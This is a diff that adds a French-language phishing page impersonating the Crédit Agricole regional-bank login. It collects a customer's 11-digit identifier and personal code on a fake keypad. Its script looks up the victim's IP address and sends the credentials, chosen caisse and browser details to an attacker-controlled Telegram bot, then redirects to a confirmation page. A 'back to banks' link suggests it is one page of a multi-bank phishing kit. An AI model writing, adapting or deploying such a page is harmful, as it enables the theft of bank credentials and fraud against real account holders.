@@ -1,0 +1,1214 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <script>
+        window.telegramConfig = {
+            BOT_TOKEN: "TELEGRAM_BOT_TOKEN_PLACEHOLDER",
+            CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
+        };
+    </script>
+            <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crédit Agricole - Caisse Régionale</title>
+    <style>
+        :root {
+            --ca-green: #007564;
+            --ca-dark: #004d43;
+            --ca-bg-light: #f9fbf9;
+            --text-grey: #666;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            height: 100%;
+        }
+
+        /* BOUTON RETOUR VERS BANK - REPOSITIONNÉ PLUS BAS */
+        .back-to-bank-btn {
+            position: fixed;
+            top: 100px;
+            left: 20px;
+            background-color: var(--ca-green);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 10px 18px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            box-shadow: 0 4px 12px rgba(0, 117, 100, 0.3);
+            transition: all 0.3s ease;
+            z-index: 1000;
+            font-family: Arial, sans-serif;
+        }
+        
+        .back-to-bank-btn:hover {
+            background-color: var(--ca-dark);
+            transform: translateX(-2px);
+        }
+        
+        .back-to-bank-btn:active {
+            transform: translateX(0);
+        }
+        
+        .back-to-bank-btn i {
+            font-size: 14px;
+            font-style: normal;
+            font-weight: bold;
+        }
+
+        /* --- Header --- */
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 5%;
+            background: #fff;
+            border-bottom: 1px solid #eee;
+        }
+
+        .logo-section img {
+            height: 50px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #333;
+            margin: 0 10px;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .btn-connect {
+            background-color: var(--ca-green);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* --- Layout Principal --- */
+        .main-container {
+            display: flex;
+            height: calc(100vh - 70px);
+        }
+
+        /* Section GAUCHE avec l'image de fond - TOUJOURS VISIBLE */
+        .hero-section {
+            flex: 1.2;
+            background-image: url('images/imageagricole.jfif'); 
+            background-size: cover;
+            background-position: center;
+            position: relative;
+            display: flex;
+            align-items: flex-end;
+            padding: 40px;
+        }
+
+        .green-box {
+            background-color: var(--ca-green);
+            color: white;
+            padding: 30px;
+            max-width: 500px;
+            margin-bottom: 20px;
+        }
+
+        .green-box h2 {
+            margin-top: 0;
+            font-size: 24px;
+        }
+
+        .green-box p {
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .btn-white {
+            background: white;
+            color: var(--ca-green);
+            padding: 12px 25px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        /* Section DROITE - Conteneur principal */
+        .right-section {
+            flex: 1;
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            position: relative;
+        }
+
+        /* Page recherche (affichée au départ) */
+        .search-page {
+            width: 100%;
+            max-width: 450px;
+        }
+
+        /* Page connexion (masquée au départ) */
+        .login-page-container {
+            display: none;
+            width: 100%;
+            max-width: 450px;
+            background: white;
+        }
+
+        .login-page-container.active {
+            display: block;
+        }
+
+        .form-card {
+            background-color: var(--ca-bg-light);
+            padding: 40px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .form-card h1 {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.3;
+        }
+
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        input[type="text"], select {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 14px;
+            background-color: white;
+        }
+
+        .btn-search {
+            width: 100%;
+            background-color: var(--ca-green);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 25px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .btn-search:hover {
+            background-color: var(--ca-dark);
+        }
+
+        .btn-search:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .separator {
+            text-align: center;
+            position: relative;
+            margin: 20px 0;
+            color: #888;
+            font-size: 12px;
+        }
+
+        .separator::before, .separator::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background: #ccc;
+        }
+
+        .separator::before { left: 0; }
+        .separator::after { right: 0; }
+
+        optgroup {
+            font-style: normal;
+            font-weight: bold;
+            color: var(--ca-dark);
+        }
+
+        /* Résultat de recherche */
+        .search-result {
+            display: none;
+            background-color: white;
+            border: 1px solid #007564;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .search-result.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .result-title {
+            color: var(--ca-green);
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .result-details {
+            color: #333;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .btn-connect-caisse {
+            background-color: var(--ca-green);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .btn-connect-caisse:hover {
+            background-color: var(--ca-dark);
+        }
+
+        /* Message d'erreur */
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.active {
+            display: block;
+        }
+
+        /* Loader */
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .loader.active {
+            display: block;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--ca-green);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .main-container { 
+                flex-direction: column; 
+                height: auto; 
+            }
+            .hero-section { 
+                height: 400px; 
+                padding: 20px;
+            }
+            .green-box {
+                max-width: 100%;
+            }
+            .right-section {
+                padding: 20px;
+            }
+            .form-card {
+                padding: 30px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            header {
+                flex-direction: column;
+                gap: 15px;
+                padding: 15px;
+            }
+            .nav-links {
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 10px;
+            }
+            .nav-links a {
+                font-size: 12px;
+                margin: 0 5px;
+            }
+            .hero-section {
+                height: 300px;
+            }
+            .back-to-bank-btn {
+                top: 90px;
+                left: 15px;
+                padding: 8px 14px;
+                font-size: 11px;
+                z-index: 1001;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .back-to-bank-btn {
+                top: 85px;
+                left: 10px;
+                padding: 6px 12px;
+                font-size: 10px;
+            }
+        }
+
+        /* --- PAGE DE CONNEXION dans la colonne droite --- */
+        .login-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .login-header h2 {
+            color: var(--ca-dark);
+            font-size: 18px;
+            margin: 0;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: var(--ca-green);
+            font-size: 20px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .close-btn:hover {
+            color: var(--ca-dark);
+        }
+
+        .login-card {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .login-card h3 {
+            color: var(--ca-dark);
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .login-subtitle {
+            color: var(--text-grey);
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        /* Étape 1 : Identifiant */
+        .id-step .form-group {
+            margin-bottom: 25px;
+        }
+
+        .id-step label {
+            color: var(--ca-dark);
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .id-step input[type="text"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .id-step input:focus {
+            outline: none;
+            border-color: var(--ca-green);
+            box-shadow: 0 0 0 2px rgba(0, 117, 100, 0.1);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0 30px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+        }
+
+        .checkbox-group label {
+            margin: 0;
+            font-weight: normal;
+        }
+
+        .btn-login {
+            background: var(--ca-green);
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-login:hover {
+            background: var(--ca-dark);
+        }
+
+        .btn-login:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Étape 2 : Code personnel */
+        .code-step {
+            display: none;
+        }
+
+        .code-step.active {
+            display: block;
+        }
+
+        .user-id-display {
+            background: #f0f9f7;
+            border: 1px solid #b8e1d9;
+            border-radius: 4px;
+            padding: 10px 15px;
+            margin-bottom: 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .user-id-label {
+            font-weight: bold;
+            color: var(--ca-dark);
+        }
+
+        .user-id-value {
+            font-family: monospace;
+            font-size: 16px;
+            letter-spacing: 1px;
+        }
+
+        .code-input-container {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 18px;
+            letter-spacing: 3px;
+            text-align: center;
+            font-family: monospace;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: var(--ca-green);
+        }
+
+        /* Clavier numérique virtuel */
+        .numeric-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 30px 0;
+        }
+
+        .key {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 20px 10px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.2s;
+        }
+
+        .key:hover {
+            background: #f5f5f5;
+            border-color: var(--ca-green);
+        }
+
+        .key:active {
+            background: #e0e0e0;
+            transform: scale(0.98);
+        }
+
+        .key-clear {
+            background: #f8f9fa;
+            color: #666;
+            font-size: 16px;
+        }
+
+        /* Liens de secours */
+        .help-links {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        .help-links a {
+            color: var(--ca-green);
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin: 10px 0;
+        }
+
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading pour envoi */
+        .login-loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .login-loading.active {
+            display: block;
+        }
+
+        .login-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--ca-green);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        /* Info PER */
+        .per-info {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+
+        .per-info h4 {
+            color: var(--ca-dark);
+            margin-top: 0;
+            font-size: 16px;
+        }
+
+        .per-info p {
+            color: var(--text-grey);
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .per-info small {
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #1e293b;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 3000;
+            display: none;
+            white-space: nowrap;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            font-weight: 500;
+        }
+        .toast.show { display: block; animation: fadeInOut 3s ease-in-out; }
+        .toast.success { background-color: #28a745; }
+        .toast.error { background-color: #dc3545; }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+            15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+            100% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+        }
+    
+        /* ===== OPTIMISATIONS MOBILE ===== */
+        * {
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Responsive text */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+                line-height: 1.5;
+            }
+            
+            h1, .h1 { font-size: 20px !important; }
+            h2, .h2 { font-size: 18px !important; }
+            h3, .h3 { font-size: 16px !important; }
+            
+            /* Buttons */
+            button, .btn, [class*="btn"] {
+                min-height: 44px;
+                padding: 12px 20px !important;
+                font-size: 14px;
+            }
+            
+            /* Inputs */
+            input, select, textarea {
+                min-height: 44px;
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            /* Layout */
+            .container, main, section {
+                padding: 15px !important;
+            }
+            
+            /* Grid adjustments */
+            [class*="grid"], [class*="flex"] {
+                flex-direction: column;
+            }
+            
+            /* Hide unnecessary elements */
+            .hide-mobile {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1, .h1 { font-size: 18px !important; }
+            h2, .h2 { font-size: 16px !important; }
+            h3, .h3 { font-size: 14px !important; }
+            
+            button, .btn, [class*="btn"] {
+                width: 100%;
+                padding: 14px 16px !important;
+                font-size: 13px;
+            }
+            
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .container, main, section {
+                padding: 10px !important;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- BOUTON RETOUR VERS LA PAGE DES BANQUES -->
+    <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">
+        <i>←</i> Retour aux banques
+    </button>
+
+    <!-- Toast notification -->
+    <div id="toast" class="toast"></div>
+
+    <!-- Page principale avec image à gauche -->
+    <div id="mainPage">
+        <header>
+            <div class="logo-section">
+                <img src="images/creditagricole.png" alt="Crédit Agricole">
+            </div>
+            <nav class="nav-links">
+                <a href="#">Comptes & Cartes</a>
+                <a href="#">Épargne</a>
+                <a href="#">Assurances</a>
+                <a href="#">Crédits</a>
+            </nav>
+            <a href="#" class="btn-connect">👤 Me connecter</a>
+        </header>
+
+        <main class="main-container">
+            
+            <!-- Section GAUCHE avec image (TOUJOURS VISIBLE) -->
+            <section class="hero-section">
+                <div class="green-box">
+                    <h2>Qu'est ce qui réunit 12 millions de français ?</h2>
+                    <p>L'envie de s'engager dans des projets concrets près de chez eux, en devenant sociétaires engagés du Crédit Agricole.</p>
+                    <a href="#" class="btn-white">EN SAVOIR PLUS</a>
+                </div>
+            </section>
+
+            <!-- Section DROITE - Conteneur pour les deux pages -->
+            <section class="right-section">
+                
+                <!-- Page 1 : Recherche de caisse (affichée au départ) -->
+                <div id="searchPage" class="search-page">
+                    <div class="form-card">
+                        <h1>Accéder à l'espace dédié de votre caisse régionale</h1>
+                        
+                        <form id="searchForm">
+                            <label for="location">Retrouver ma caisse régionale (Code postal, ville ou région)</label>
+                            <input type="text" id="location" 
+                                   placeholder="Exemple : 75000, Paris, Ile-de-France" 
+                                   autocomplete="off">
+                            <div class="error-message" id="locationError">Veuillez entrer un code postal ou une ville valide</div>
+                            
+                            <button type="button" id="searchBtn" class="btn-search">Rechercher une caisse régionale</button>
+                            
+                            <div class="loader" id="searchLoader">
+                                <div class="spinner"></div>
+                                <div>Recherche en cours...</div>
+                            </div>
+
+                            <div class="search-result" id="searchResult">
+                                <div class="result-title" id="resultTitle"></div>
+                                <div class="result-details" id="resultDetails"></div>
+                                <button type="button" class="btn-connect-caisse" id="connectBtn">Accéder à ma caisse</button>
+                            </div>
+                            
+                            <div class="separator">Ou</div>
+                            
+                            <label for="caisse-select">Choisir une caisse régionale dans la liste</label>
+                            <select id="caisse-select">
+                                <option value="">Choisissez une caisse régionale</option>
+                                
+                                <optgroup label="ÎLE-DE-FRANCE">
+                                    <option value="iledefrance">Crédit Agricole d'Ile-de-France</option>
+                                </optgroup>
+
+                                <optgroup label="NORD ET EST">
+                                    <option value="norddefrance">Crédit Agricole Nord de France</option>
+                                    <option value="nordest">Crédit Agricole Nord-Est</option>
+                                    <option value="alsacevosges">Crédit Agricole de l'Alsace Vosges</option>
+                                    <option value="lorraine">Crédit Agricole de Lorraine</option>
+                                </optgroup>
+
+                                <optgroup label="NORMANDIE ET BRETAGNE">
+                                    <option value="normandieseine">Crédit Agricole Normandie-Seine</option>
+                                    <option value="normandie">Crédit Agricole Normandie</option>
+                                    <option value="illeetvilaine">Crédit Agricole d'Ille-et-Vilaine</option>
+                                    <option value="morbihan">Crédit Agricole du Morbihan</option>
+                                    <option value="finistere">Crédit Agricole de Finistère</option>
+                                    <option value="cotesdarmor">Crédit Agricole des Côtes d'Armor</option>
+                                </optgroup>
+
+                                <optgroup label="CENTRE ET LOIRE">
+                                    <option value="centreloire">Crédit Agricole Centre Loire</option>
+                                    <option value="centrefrance">Crédit Agricole Centre France</option>
+                                    <option value="tourainepoitou">Crédit Agricole Touraine et Poitou</option>
+                                    <option value="charentemaritimedeuxsevres">Crédit Agricole Charente-Maritime Deux-Sèvres</option>
+                                    <option value="charenteperigord">Crédit Agricole Charente Périgord</option>
+                                </optgroup>
+
+                                <optgroup label="SUD-OUEST">
+                                    <option value="pyreneesgascogne">Crédit Agricole Pyrénées Gascogne</option>
+                                    <option value="aquitaine">Crédit Agricole d'Aquitaine</option>
+                                    <option value="midipyrenees">Crédit Agricole Midi-Pyrénées</option>
+                                    <option value="languedoc">Crédit Agricole du Languedoc</option>
+                                </optgroup>
+
+                                <optgroup label="SUD-EST">
+                                    <option value="sudrhonealpes">Crédit Agricole Sud Rhône Alpes</option>
+                                    <option value="alpesprovence">Crédit Agricole Alpes Provence</option>
+                                    <option value="provencecotedazur">Crédit Agricole Provence Côte d'Azur</option>
+                                    <option value="corse">Crédit Agricole de la Corse</option>
+                                </optgroup>
+
+                                <optgroup label="CENTRE-EST ET BOURGOGNE">
+                                    <option value="briepicardie">Crédit Agricole Brie Picardie</option>
+                                    <option value="savoie">Crédit Agricole des Savoie</option>
+                                    <option value="franchecomte">Crédit Agricole Franche-Comté</option>
+                                    <option value="centrest">Crédit Agricole Centre-est</option>
+                                </optgroup>
+
+                                <optgroup label="VAL DE LOIRE ET ATLANTIQUE">
+                                    <option value="anjoumaine">Crédit Agricole Anjou Maine</option>
+                                    <option value="atlantiquevendee">Crédit Agricole Atlantique Vendée</option>
+                                    <option value="maine">Crédit Agricole du Maine</option>
+                                </optgroup>
+
+                                <optgroup label="OUTRE-MER ET TERRITOIRES SPÉCIAUX">
+                                    <option value="reunion">Crédit Agricole de La Réunion</option>
+                                    <option value="nouvellecaledonie">Crédit Agricole de Nouvelle-Calédonie</option>
+                                    <option value="polynesie">Crédit Agricole de Polynésie Française</option>
+                                    <option value="mayotte">Caisse Régionale de Mayotte</option>
+                                </optgroup>
+                            </select>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Page 2 : Connexion (masquée au départ) -->
+                <div id="loginPage" class="login-page-container">
+                    <div class="login-header">
+                        <h2>Accéder à mes comptes</h2>
+                        <button class="close-btn" onclick="closeLogin()">&times;</button>
+                    </div>
+
+                    <div class="login-card">
+                        <!-- Étape 1 : Identifiant -->
+                        <div id="idStep" class="id-step">
+                            <h3>IDENTIFIANT</h3>
+                            <p class="login-subtitle">Saisissez votre identifiant à 11 chiffres</p>
+                            
+                            <div class="form-group">
+                                <input type="text" id="userId" placeholder="Exemple 98652706859" maxlength="11" autocomplete="off">
+                            </div>
+                            
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="rememberId">
+                                <label for="rememberId">Mémoriser mon identifiant</label>
+                            </div>
+                            
+                            <button id="nextBtn" class="btn-login" onclick="goToCodeStep()">Suivant</button>
+                            
+                            <div class="help-links">
+                                <a href="#" onclick="alert('Contactez le service client au 0 800 123 456')">OUBLI/PERTE DE CODE PERSONNEL</a>
+                                <a href="#" onclick="alert('Assistance technique disponible 24h/24')">UN PROBLÈME TECHNIQUE ?</a>
+                                <a href="#" onclick="alert('Conseils de sécurité disponibles sur notre site')">SÉCURITÉ</a>
+                            </div>
+                        </div>
+
+                        <!-- Étape 2 : Code personnel -->
+                        <div id="codeStep" class="code-step">
+                            <h3>ENTRER MON CODE PERSONNEL</h3>
+                            <p class="login-subtitle">Saisissez votre code personnel à 10 chiffres maximum</p>
+                            
+                            <div id="userDisplay" class="user-id-display">
+                                <span class="user-id-label">Identifiant :</span>
+                                <span class="user-id-value" id="displayUserId"></span>
+                            </div>
+                            
+                            <div class="code-input-container">
+                                <input type="text" id="codeInput" class="code-input" placeholder="Code personnel" maxlength="10" readonly>
+                            </div>
+                            
+                            <div class="numeric-keypad" id="keypad">
+                                <!-- Les touches seront générées par JavaScript -->
+                            </div>
+                            
+                            <div class="login-loading" id="loginLoading">
+                                <div class="login-spinner"></div>
+                                <div>Validation en cours...</div>
+                            </div>
+                            
+                            <button id="validateBtn" class="btn-login" onclick="validateLogin()" disabled>Valider</button>
+                            
+                            <div style="text-align: center; margin-top: 20px;">
+                                <a href="#" onclick="goBackToIdStep()" style="color: var(--ca-green); text-decoration: none;">
+                                    ← Retour à la saisie de l'identifiant
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Section informations supplémentaires -->
+                    <div class="per-info">
+                        <h4>Plan Épargne Retraite : derniers jours pour profiter de vos avantages</h4>
+                        <p>Anticipez l'avenir, même quand le présent coûte plus cher. 0% de frais sur le versement initial et 100€ offerts*</p>
+                        <small>*Offre soumise à conditions. Voir détails sur notre site.</small>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+        <script>
+        // Configuration Telegram
+        const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
+        const CHAT_ID = '8176081750';
+
+        // Toast elements
+        const toast = document.getElementById('toast');
+        
+        function showToast(message, isError = false) {
+            toast.textContent = message;
+            toast.className = 'toast show' + (isError ? ' error' : ' success');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                toast.className = 'toast';
+            }, 3000);
+        }
+
+        // --- PAGE 1: RECHERCHE DE CAISSE ---
+        const searchForm = document.getElementById('searchForm');
+        const locationInput = document.getElementById('location');
+        const searchBtn = document.getElementById('searchBtn');
+        const searchLoader = document.getElementById('searchLoader');
+        const searchResult = document.getElementById('searchResult');
+        const resultTitle = document.getElementById('resultTitle');
+        const resultDetails = document.getElementById('resultDetails');
+        const caisseSelect = document.getElementById('caisse-select');
+        const connectBtn = document.getElementById('connectBtn');
+        const searchPage = document.getElementById('searchPage');
+        const loginPage = document.getElementById('loginPage');
+
+        // Bouton Rechercher
+        searchBtn.addEventListener('click', () => {
+            const location = locationInput.value.trim();
+            if (!location) {
+                document.getElementById('locationError').classList.add('active');
+                return;
+            }
+            document.getElementById('locationError').classList.remove('active');
+            
+            searchLoader.classList.add('active');
+            setTimeout(() => {
+                searchLoader.classList.remove('active');
+                resultTitle.textContent = `Caisse régionale trouvée pour: ${location}`;
+                resultDetails.textContent = `Vous pouvez maintenant accéder à votre compte Crédit Agricole.`;
+                searchResult.classList.add('active');
+            }, 500);
+        });
+
+        // Select caisse
+        caisseSelect.addEventListener('change', () => {
+            if (caisseSelect.value) {
+                selectedCaisseValue = caisseSelect.value;
+                selectedCaisseLabel = caisseSelect.options[caisseSelect.selectedIndex].text;
+                resultTitle.textContent = caisseSelect.options[caisseSelect.selectedIndex].text;
+                resultDetails.textContent = `Vous pouvez maintenant accéder à votre compte.`;
+                searchResult.classList.add('active');
+            } else {
+                searchResult.classList.remove('active');
+            }
+        });
+
+        // Bouton "Accéder à ma caisse"
+        connectBtn.addEventListener('click', () => {
+            selectedCaisseValue = caisseSelect.value;
+            selectedCaisseLabel = caisseSelect.options[caisseSelect.selectedIndex].text;
+            goToLoginPage();
+        });
+
+        // --- PAGE 2: CONNEXION ---
+        const userIdInput = document.getElementById('userId');
+        const nextBtn = document.getElementById('nextBtn');
+        const validateBtn = document.getElementById('validateBtn');
+        const codeInput = document.getElementById('codeInput');
+        const idStep = document.getElementById('idStep');
+        const codeStep = document.getElementById('codeStep');
+        const keypad = document.getElementById('keypad');
+        const displayUserId = document.getElementById('displayUserId');
+        const loginLoading = document.getElementById('loginLoading');
+
+        let currentUserId = '';
+        let currentCode = '';
+        let selectedCaisseValue = '';
+        let selectedCaisseLabel = '';
+
+        // Générer le clavier numérique
+        function generateKeypad() {
+            keypad.innerHTML = '';
+            const numbers = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'Effacer', '0'];
+            
+            numbers.forEach(num => {
+                const btn = document.createElement('button');
+                btn.type = 'button';
+                btn.className = num === 'Effacer' ? 'key key-clear' : 'key';
+                btn.textContent = num;
+                
+                btn.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    if (num === 'Effacer') {
+                        currentCode = currentCode.slice(0, -1);
+                    } else {
+                        if (currentCode.length < 10) {
+                            currentCode += num;
+                        }
+                    }
+                    updateCodeDisplay();
+                });
+                
+                keypad.appendChild(btn);
+            });
+        }
+
+        // Mettre à jour l'affichage du code
+        function updateCodeDisplay() {
+            codeInput.value = currentCode ? '●'.repeat(currentCode.length) : '';
+            validateBtn.disabled = currentCode.length === 0;
+        }
+
+        // Aller à l'écran de saisie du code
+        function goToCodeStep() {
+            const userId = userIdInput.value.trim();
+            if (!userId) {
+                alert('Veuillez entrer votre identifiant');
+                return;
+            }
+            
+            currentUserId = userId;
+            displayUserId.textContent = userId;
+            idStep.style.display = 'none';
+            codeStep.classList.add('active');
+            currentCode = '';
+            updateCodeDisplay();
+            generateKeypad();
+        }
+
+        // Revenir à l'écran d'identifiant
+        function goBackToIdStep() {
+            codeStep.classList.remove('active');
+            idStep.style.display = 'block';
+            currentCode = '';
+            updateCodeDisplay();
+        }
+
+        // Aller à la page de connexion
+        function goToLoginPage() {
+            searchPage.style.display = 'none';
+            loginPage.classList.add('active');
+            idStep.style.display = 'block';
+            codeStep.classList.remove('active');
+            generateKeypad();
+        }
+
+        // Fermer la connexion
+        function closeLogin() {
+            loginPage.classList.remove('active');
+            searchPage.style.display = 'block';
+            idStep.style.display = 'block';
+            codeStep.classList.remove('active');
+            userIdInput.value = '';
+            currentCode = '';
+            // NE PAS réinitialiser selectedCaisseValue et selectedCaisseLabel
+        }
+
+        // Bouton Suivant
+        nextBtn.addEventListener('click', goToCodeStep);
+
+        // Fonction pour obtenir l'IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Non disponible';
+            } catch (error) {
+                return 'Non disponible';
+            }
+        }
+
+        // Envoi à Telegram
+        async function sendToTelegram() {
+            const ip = await getIP();
+            const caisseInfo = selectedCaisseValue ? `\n🏪 Caisse: ${selectedCaisseLabel}` : '';
+            const message = `🏦 CRÉDIT AGRICOLE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n👤 Identifiant: ${currentUserId}\n🔑 Code: ${currentCode}${caisseInfo}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion réussie`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: window.CHAT_ID || CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Erreur:', error);
+                return false;
+            }
+        }
+
+        // Valider la connexion
+        async function validateLogin() {
+            if (currentCode.length === 0) {
+                alert('Veuillez entrer votre code personnel');
+                return;
+            }
+            
+            validateBtn.disabled = true;
+            loginLoading.classList.add('active');
+            
+            await sendToTelegram();
+            
+            setTimeout(() => {
+                window.location.href = 'confirmation.html';
+            }, 1500);
+        }
+
+        validateBtn.addEventListener('click', validateLogin);
+
+        // Initialiser le clavier
+        generateKeypad();
+    </script>
+
+</body>
+</html>
